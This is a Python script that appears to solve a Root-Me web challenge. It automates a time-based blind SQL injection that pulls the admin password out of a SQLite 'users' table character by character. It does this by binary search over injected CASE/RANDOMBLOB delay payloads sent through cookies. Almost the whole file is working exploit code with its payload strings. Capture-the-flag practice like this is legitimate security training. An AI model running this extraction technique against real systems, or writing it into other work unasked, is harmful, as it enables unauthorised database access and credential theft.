from src.payload_and_stuff import sending_payload_for_time_based_SQLi_getv
import sys
from colorama import Fore, Style
from src.info_message import output_message, warning_message, successful_message
from src.binary_search import  binary_search_boolean
from src.info_message import welcome_message



def get_password_with_time_based_SQLi():

    welcome_message()
        
    #Initialisation of variable
    indice = 1 #use to change the indice of the password 
    result = [] #list all the found character 
    success = True 
    url = 'http://challenge01.root-me.org/web-serveur/ch10/'

    while indice <= 20: #we assume that the password have 20 character
        if success: #initialisation of all variable used during the process
            liste = ['0','1','2','3','4','5','6','7','8','9','a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']    
            low_bound = 0
            high_bound = 36
            mid_point = 18
            operator1 = '>'
            operator2 = '='
            payload_parameter1 = f"{operator1}'{liste[mid_point]}'"
            payload_parameter2 = f"{operator2}'{liste[mid_point]}'"
            success = False

        while low_bound <= high_bound:
            bad_sql1 = f"'+AND+(SELECT+CASE+WHEN+(SELECT+SUBSTR(password,{indice},1)+FROM+users+WHERE+username='admin'){payload_parameter1}+THEN+1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))+ELSE+null+END)--"
            bad_sql2 = f"'+AND+(SELECT+CASE+WHEN+(SELECT+SUBSTR(password,{indice},1)+FROM+users+WHERE+username='admin'){payload_parameter2}+THEN+1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))+ELSE+null+END)--"
            cookie1 = {
                    ...
                    }   
            cookie2 = {
                    ...
                    }   
            output_message(f"[++] Tested payload : {payload_parameter1}, {payload_parameter2}")
            output_message(f"[++] Current terminal : low = {low_bound}, higt = {high_bound}, binary_average = {mid_point}")
            output_message(f"[++] Index number : {indice}")
            result_bool, result_contol= sending_payload_for_time_based_SQLi_getv(payload_parameter1, payload_parameter2, url, indice, cookie1, cookie2)
            print(f"Result_bool: {result_bool}, Result_control: {result_contol}\n")
            
            if result_contol == True:
                success = True
                successful_message(f"Succesfull payload with {payload_parameter2} parameter !!!")
                result.append(liste[mid_point])
                print(Fore.YELLOW + f"Payload result... {''.join(result)}\n\n" + Style.RESET_ALL)                
                indice +=1
                break
            
            high_bound,low_bound,mid_point = binary_search_boolean(result_bool, operator1, high_bound, low_bound, mid_point)     
            mid_point = (low_bound+high_bound)//2
            payload_parameter1 = f"{operator1}'{liste[mid_point]}'"
            payload_parameter2 = f"{operator2}'{liste[mid_point]}'"
                        
        if low_bound > high_bound :
            warning_message("All tests failed :( ")
            break
            
        
        
if __name__=='__main__':
    get_password_with_time_based_SQLi()
